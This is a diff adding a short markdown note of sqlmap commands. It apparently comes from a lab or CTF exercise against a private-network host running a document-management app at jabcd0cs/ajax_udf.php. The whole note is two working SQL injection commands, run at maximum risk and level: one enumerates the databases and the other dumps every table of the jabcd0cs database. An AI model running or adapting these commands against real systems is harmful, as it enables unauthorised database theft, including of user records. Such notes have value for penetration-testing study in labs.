@@ -1,0 +1,14 @@
+# SQL Injection & SQLMAP commands
+
+## SQLmap command
+
+1. To list the databases
+sqlmap -u "http://192.168.124.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user"  --risk=3 --level=5 --dbs --threads=4 --batch
+
+2. List all the datas from a database
+sqlmap -u "http://192.168.124.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user"  -D jabcd0cs --risk=3 --level=5 --dump-all --batch
+
+Database name - jabcd0cs
+
+
+
